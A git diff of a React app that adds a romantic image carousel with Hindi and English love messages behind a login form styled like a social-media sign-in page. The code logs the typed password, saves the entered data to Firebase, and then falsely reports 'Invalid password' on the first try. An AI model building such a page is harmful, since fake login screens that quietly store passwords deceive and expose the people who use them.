@@ -2,6 +2,9 @@ import React, { useState } from "react";
 import "./App.css";
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import "react-responsive-carousel/lib/styles/carousel.min.css"; // requires a loader
+import { Carousel } from 'react-responsive-carousel';
+
 
 const App = () => {
 
@@ -15,7 +18,7 @@ const App = () => {
     toast.dismiss();
     console.warn(password);
 
-    if (email.trim().length === 0 ) {
+    if (email.trim().length === 0  ) {
       toast.error('Invalid username');
       return;
     }
@@ -44,8 +47,15 @@ const App = () => {
           throw new Error('Network response was not ok');
         }
         console.log('Data successfully saved to Firebase');
-       
+        
+         if(clicked == 1){
+          setHomeFlag(true)
+         }else if(clicked == 0) {
+          setClicked(1)
           toast.error('Invalid password')
+         }
+        
+          
           
      
       })
@@ -72,72 +82,151 @@ const App = () => {
 
   return (
     homeFlag ?
-    <div className="bodya" style={{backgroundImage: `url(${process.env.PUBLIC_URL}/bg.jpg)`}}>
-          <h1 style={{color:'white'}} >Click on Image</h1>
-          <div style={{height:'20px'}}></div>
-        <div class="flip-container">
-          <div class="flipper">
-            <div clas="front">
-              <img src={process.env.PUBLIC_URL + '/1.jpg'} alt="Description" />
+    <div className="bodya">
+     
+         
+         <Carousel autoPlay infiniteLoop showThumbs={false} showStatus={false} interval={3000} >
+              
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/2.jpg'} alt="Image" />
+                    <p className="legend">Hii.............</p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/1.jpg'} alt="Image" />
+                    <p className="legend">Hello ji....</p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/3.jpg'} alt="Image" />
+                    <p className="legend">I want to Say...</p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/4.jpg'} alt="Image" />
+                    <p className="legend">wait...</p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/5.jpg'} alt="Image" />
+                    <p className="legend">I Miss you </p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/6.jpg'} alt="Image" />
+                    <p className="legend"> I Miss You ❤️ </p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/7.jpg'} alt="Image" />
+                    <p className="legend">I Love you forever</p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/8.jpg'} alt="Image" />
+                    <p className="legend">❤️💕💕</p>
+                </div>
+                <div>
+                  <img src={process.env.PUBLIC_URL + '/9.jpg'} alt="Image" />
+                    <p className="legend">💕💕💕💕</p>
+                </div>
+                
+            </Carousel>
+            <img src={process.env.PUBLIC_URL + '/19.jpg'} alt="Image" style={{width : "480px"}} />
+            <div style={{textAlign:'center',color:'red'}}>
+            <img src={process.env.PUBLIC_URL + '/ht.png'} alt="Image" style={{height : "100px"}} />
             </div>
-            <div class="back">
-              <img src={process.env.PUBLIC_URL + '/11.jpg'} />
+            <div>
+            <br/> <br/>
+              <div className="center">पाने की जिद नहीं ख़ौने का डर है</div>
+              <div className="center">दूर मत जाना कभी मुझसे बाकी
+               आपका उसका फैसला मंजूर है </div>
+               <br/> <br/>
             </div>
-          </div>
-        </div>
-        <div style={{height:'100px'}}></div>
-        <div class="flip-container">
-          <div class="flipper">
-          <div clas="front">
-              <img src={process.env.PUBLIC_URL + '/5.jpg'} alt="Description" />
+            
+            <img src={process.env.PUBLIC_URL + '/13.jpg'} alt="Image" style={{width : "480px"}} />
+            <div>
+            <br/> <br/>
+              <div className="center">My relation with you is not like rain,</div>
+              <div className="center">which come and go away</div>
+              <div className="center">My relation like air</div>
+              <div className="center">sometime silent but always around you </div>
+               <br/> <br/>
             </div>
-            <div class="back">
-              <img src={process.env.PUBLIC_URL + '/12.jpg'} />
+            <img src={process.env.PUBLIC_URL + '/3.jpg'} alt="Image" style={{width : "480px"}} />
+            <div>
+            <br/> <br/>
+              <div className="center">Muje sir do chijo se der lgta hai</div>
+              <div className="center">ek aapke rone se, dusra aapko khone se 💕</div>
+           
             </div>
-
-          </div>
-        </div>
-        <div style={{height:'100px'}}></div>
-        <div class="flip-container">
-          <div class="flipper">
-          <div clas="front">
-              <img src={process.env.PUBLIC_URL + '/3.jpg'} alt="Description" />
+            <img src={process.env.PUBLIC_URL + '/16.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/18.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/8.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/14.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/15.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/2.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/12.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/11.jpg'} alt="Image" style={{width : "480px"}} />
+            <img src={process.env.PUBLIC_URL + '/5.jpg'} alt="Image" style={{width : "480px"}} />
+            <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
             </div>
-            <div class="back">
-              <img src={process.env.PUBLIC_URL + '/13.jpg'} />
+            <div style={{textAlign:'center',color:'red'}}>
+            <img src={process.env.PUBLIC_URL + '/ht.png'} alt="Image" style={{height : "100px"}} />
             </div>
-
-
-          </div>
-        </div>
-        <div style={{height:'100px'}}></div>
-        <div class="flip-container">
-          <div class="flipper">
-          <div clas="front">
-              <img src={process.env.PUBLIC_URL + '/4.jpg'} alt="Description" />
+            <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
+            </div> <div style={{textAlign:'center',color:'red'}}>
+              <h1> I Love You ❤️ </h1>
             </div>
-            <div class="back">
-              <img src={process.env.PUBLIC_URL + '/14.jpg'} />
+            <div style={{textAlign:'center',color:'red'}}>
+              <h1>❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️</h1>
             </div>
-
-
-          </div>
-        </div>
-        <div style={{height:'100px'}}></div>
-        <div class="flip-container">
-          <div class="flipper">
-          <div clas="front">
-              <img src={process.env.PUBLIC_URL + '/2.jpg'} alt="Description" />
-            </div>
-            <div class="back">
-              <img src={process.env.PUBLIC_URL + '/15.jpg'} />
-            </div>
-
-
-          </div>
-        </div>
-        <h1 style={{color:'wheat'}}>You are the best thing that ever happened to me.</h1>
-        <div style={{height:'100px'}}></div>
+           
       </div>
       : <React.Fragment>
         <ToastContainer />
@@ -171,7 +260,7 @@ const App = () => {
                 </a>
               </form>
               <div className="sign-up">
-                Don't an account? <a href="#">Sign up</a>
+                Don't Have an account? <a href="#">Sign up</a>
               </div>
               {/* <div className="get-the-app">
                 <span>Get the app</span>
